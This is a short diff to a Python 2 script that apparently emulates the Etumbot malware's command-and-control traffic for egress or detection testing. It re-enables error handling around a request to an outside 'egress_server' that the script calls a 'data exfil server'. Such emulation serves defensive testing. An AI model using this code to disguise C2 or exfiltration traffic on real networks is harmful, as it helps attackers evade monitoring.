@@ -9,7 +9,6 @@ https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/APT/etumbot.profile
 
 import random
 import sys
-import time
 import urllib2
 
 
@@ -86,13 +85,12 @@ class Actor:
             get_req2 = urllib2.Request(
                 "http://" + self.egress_server + etumbot_uri, headers=etumbot_headers)
 
-            #try:
-            urllib2.urlopen(get_req2)
-            #except urllib2.URLError:
-            #    print "[*] Error: Cannot connect to etumbot data exfil server!"
-            #    print "[*] Error: Possible firewall, or proxy prventing this?"
-            #    print "URI == " + etumbot_uri
-            time.sleep(.5)
+            try:
+                urllib2.urlopen(get_req2)
+            except urllib2.URLError:
+                print "[*] Error: Cannot connect to etumbot data exfil server!"
+                print "[*] Error: Possible firewall, or proxy prventing this?"
+                print "URI == " + etumbot_uri
 
         print "[*] INFO: Etumbot C2 comms complete!"
         return
